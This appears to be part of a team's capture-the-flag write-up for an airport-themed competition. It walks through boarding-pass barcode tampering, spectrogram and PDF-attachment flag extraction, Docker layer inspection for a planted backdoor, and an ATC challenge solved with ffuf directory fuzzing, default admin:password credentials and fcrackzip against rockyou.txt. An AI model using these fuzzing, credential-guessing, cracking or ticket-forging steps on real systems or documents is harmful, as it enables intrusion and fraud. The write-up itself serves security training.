1. We used an online tool <https://online-barcode-reader.inliteresearch.com/> to extract current barcode text which was: `M1RAMBO/JOHN        EHKGZFR TLLRIXEE 4253 269Y004D0021`
2. After searching on internet how the structure of boarding pass tickets are built we managed to understand existing structure: <https://javadude.wordpress.com/2017/10/07/whats-in-my-boarding-pass-barcode/>
3. We did our modification on barcode text that ended up with: `M1RAMBO/JOHN ECTF123 TAYSYDEE 0777 269Y004D0021`

In our modification: E stands for electronic ticket, CTF123 stands for ticket number, TAY stands for Tartu airport number, SYD stands for Sydnay airport number, EE stands for Nordic airline, 0777 stands for our flight number

#### ATIS

```md
You have a suspicion that in addition to the ransomware, data is also exfiltrated out of the ATC networks.
All outbound traffic is monitored but new data is still appearing in the dark web
From when the attacks started, ATIS has been getting continuous phone calls.
Maybe it's worth investigating?
QUESTION
Investigate the ATIS call to see if you can find anything odd!
```

##### Solution

Simple solution - download [Audacity](https://www.audacityteam.org/download/)
(open-source audio editor software), then open the provided audio file and switch to the spectrogram view
to see the flag.

##### Steps

1. Download Audacity.
2. Open the specified file through Audacity.
3. Switch to the Spectogram View.
4. Flag is shown in the spectrogram window: `ctf-tech{f571324-9bd3}`.

![Automated flag](../../images/atis-flag.png){: .image-process-crisp}

#### FLIGHT-PLAN

```md
DESCRIPTION
After everything is cleared you start to wonder about the origin of this attack.
When inspecting the logs, a correlation between the start of the compromise and a pdf file arriving to the ATC can be made.
QUESTION
Inspect the flight plan, find out if there is anything malicious hidden in it.
Flag format: uuid v4
<https://static.ctftech.io/challs/flight-plan.pdf?_gl=1*18nguau*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDkxMjAyOC43LjEuMTY2NDkxMjAyOS4wLjAuMA..>
```

##### Solution

For this task `qpdf` package and Wine was used to access the flag. The flag was in an different PDF attached to
the given one, which needed to be extracted using a utility tool, the attachemnt was a windows executable, but for that `wine` was used.

##### Steps

Install qpdf package with `sudo apt-get install qpdf`.

List attachments of the PDF file: `qpdf --list-attachments flight-plan.pdf`  

![PDF contents](../../images/flight-plan-contents.png){: .image-process-crisp}

Export the found attachment.

```bash
qpdf --show-attachment="ATS flight plan-ori" flight-plan.pdf > attachment.pdf
```

Open `attachment.pdf` using `wine` with command: `wine ATS\ flight\ plan-ori.pdf`

- The attachment was not a PDF file, but a Windows executable.

The flag is displayed after opening the attachment using `wine`.

![PDF flag](../../images/flight-plan-flag.png){: .image-process-crisp}

#### WEATHER DATA

```md
DESCRIPTION
A pilot calls and complains that the weather is visibly different to what is noted in the report.
Without the correct data landing could be very difficult.
METAR is a format for reporting weather information.
A METAR weather report is predominantly used by aircraft pilots to assist in weather forecasting

During the ransomware attacks the METAR data was corrupted.
Data analysts discovered that the METAR file was split into two different files.
Every other row was moved to the second file.
Row 1 >> split1.csv
Row 2 >> split2.csv
Row 3 >> split1.csv
And so on...
QUESTION
Help the data analysts to combine the files back into one file
Answer is the md5sum of the combined file
```

##### Solution

Solution here was to merge two files into one and get the md5sum of the file.

##### Steps

Simply run the following bash one-liner:

```bash
paste -d '\n' split1.csv split2.csv | grep . | md5sum
```

- the md5sum was sumbitted, which was the flag.

#### TOP-SECRET

```md
DESCRIPTION
Management found out that the highly sensitive and top secret documents are accessible to all!
They must be hidden ASAP!
TOP-SECRET web page
TASK
You must protect this apache web server with authentication!
Configure basic authentication to protect the page
Use these credentials for auth:
Username: mulder
Password: Scully-th3-b3st!

SSH access:
Hostname: env263.target02 Port: 2222
Username: user
Password: Cool2Pass
```

##### Solution

The challenge was solved by connecting to the server, adding authentication to the `evidence` folder and after a restart of the service it was possible to get the flag by "submit'ing" the challenge which used a script to check if the authentication was correctly set.

Links used when going through the challenge:

- <https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/>
- <https://coderwall.com/p/zvvgna/create-htpasswd-file-for-nginx-without-apache>

##### Steps

Connect using SSH: `sshpass -p Cool2Pass ssh -p 2222 user@env263.target02`.

- `sshpass` needs to be installed separately.

Examine the contents of `/var/www/html`. The `evidence` folder needs to be protected.

![HTML folder](../../images/top-secret-html.png){: .image-process-crisp}

Change current directory to `/var/www/html/evidence` and execute the following:

```bash
# Generated a password file
$ sudo printf "mulder:`openssl passwd -apr1 Scully-th3-b3st\!`\n" | sudo tee .htpasswd
mulder:$apr1$xVxxLLon$ASAgafxUZWNMiaSJzbK1n.
```

- This generates a credential file for the specific folder.

Open apache configuration and specify that the directory is protected:

```bash
# Did the following, because it didn't immediatelly work
# Opened the configuration
sudo vim /etc/apache2/apache2.conf

# added the following content
<Directory "/var/www/html">
  AuthType Basic
  AuthName "Restricted Content"
  AuthUserFile /etc/apache2/.htpasswd
  Require valid-user
</Directory>
```

Finally restarted the apache service using `sudo service apache2 restart` and after pressing submit in the challenge platform, was able to pass the challenge.

Here's the expected login prompt:

![Login prompt](../../images/top-secret-login.png){: .image-process-crisp}

#### BACKDOORED IMAGE

```md
DESCRIPTION
Developers have noticed that latest version of a SSH jumphost which they are using for remote access is acting weirdly.
When inspecting logs, they notice logins from strange accounts that should not be there.
Their own dev account password also seems to be compromised, as logins are coming from unknown IP addresses. Sysadmins have recreated the jumphost container from the latest image but with no luck.
Same activity is still seen. Could the Docker repository be hacked? Could the hackers have tampered with the image? You must find out!
QUESTION
What flag is stored in the backdoor?
Pull the jumphost image from docker.io/cybexer/ctf-jumphost:latest and find out how the image was compromised.
```

##### Solution

First Docker Hub was used to inspect the hosted image and using that information the image was download and saved to a `.tar` file, then the file was extracted to be able to search the individual layers of the image. After doing some `find` one-liners the malicious shell script was found containing the flag.

Due to the attacker not deleting the persistance script in the same layer, it was possible to find the flag.

##### Steps

Go to Docker Hub and check all of the image layers. The layer that we are interested in is layer 9, in which a quite interesting `persistence.sh` bash script is being executed.

![Docker image layers](../../images/backdoor-image-layers.png){: .image-process-crisp}

Extract the docker image into a `.tar` file.

```bash
docker save docker.io/cybexer/ctf-jumphost:icsc > icsc-image.tar
```

Unarchive the file with `tar -xf icsc-image.tar`.

Unarchive all of the image layers by using linux `find` command.

```bash
find -name layer.tar -exec tar -xf {} \;
```

![Layer.tar structure](../../images/backdoor-layer-tar.png){: .image-process-crisp}

A `persistence.sh` script can be seen in the screenshots above and to get the flag simply open it.

#### LEAKED DATA (UNSOLVED by us)

```md
DESCRIPTION
You have managed to acquire an encrypted message from the exfiltrated data together with set of RSA public keys that belong to employees of the airport.
The keys are already extracted from certificates and saved to files with random names, thus anonymous.
It is known that the message is encrypted with one of those keys.
QUESTION
Find out what data was extracted from the network by decrypting it.
Recovered files
<https://static.ctftech.io/challs/output.zip?_gl=1*1oed30*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDg4NzYwMC41LjAuMTY2NDg4NzYwMC4wLjAuMA..>
```

Another crypto challenge which gave us trouble, but could have been done by a simple google search, only if one
of us could have just searched these keywords "RSA CTF" where the "RsaCtfTool" could have been found.

- Tool: https://github.com/RsaCtfTool/RsaCtfTool
- Solution: https://arthepsy.eu/ctf/cybershock2022/smart-airspace.leaked-data.html

#### ATC

```md
DESCRIPTION
A teller at the airport informs you that they are currently under a ransomware attack and therefore it is not possible to complete your check-in.
You offer to help and start looking for anything useful.
While visiting the air traffic control tower, you see a ransom message appear on the radar screens.
Seems that the radars somehow still work.
Maybe not everything has been encrypted yet.
QUESTION
Investigate if you can still recover some unencrypted files from the system.
ATC Radar
```

##### Solution

Solution here was to notice various paths that requred basic auth header, as investigated further username & password was `admin:password`.
After downloading `/backup` file that was `.zip` file, we had to brute-force the password for the zip file and
there was the flag for this task.

##### Steps

1. Search for common directories with

```bash
ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.target03:8080/FUZZ
```

- Notice that the it results in 403 status which means we require authentication.

2. By manually visiting the pages we are prompted for the credentials and simply trying the user `admin` and password `password`, we managed to see the content of directories.

3. Fuzzing again with the credentials in the header:

```bash
> ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.target03:8080/FUZZ -mc 200 -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="

# Fuzz output
??                      [Status: 200, Size: 7510, Words: 1852, Lines: 168, Duration: 48ms]
Admin                   [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 50ms]
admin                   [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 51ms]
ARCHIVE                 [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 36ms]
Archive                 [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 36ms]
archive                 [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 36ms]
backup                  [Status: 200, Size: 240, Words: 1, Lines: 3, Duration: 36ms]
Backup                  [Status: 200, Size: 240, Words: 1, Lines: 3, Duration: 36ms]
database                [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 44ms]
Database                [Status: 200, Size: 321, Words: 22, Lines: 23, Duration: 44ms] 
```

4. Downloading the `/backup` file we see that it's a password protected zip file.
5. By brute-forcing the password using `fcrackzip` the password was found:

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt "backup.zip"
```

- the password was `987654321`.

6. After extracting the contents and viewing the file, the flag was found.

## Links

- [Winning team's "EVOSEC" write-up](https://arthepsy.eu/ctf/cybershock2022/)
- [CyberShock page](https://cybershock.lv/#ctf)
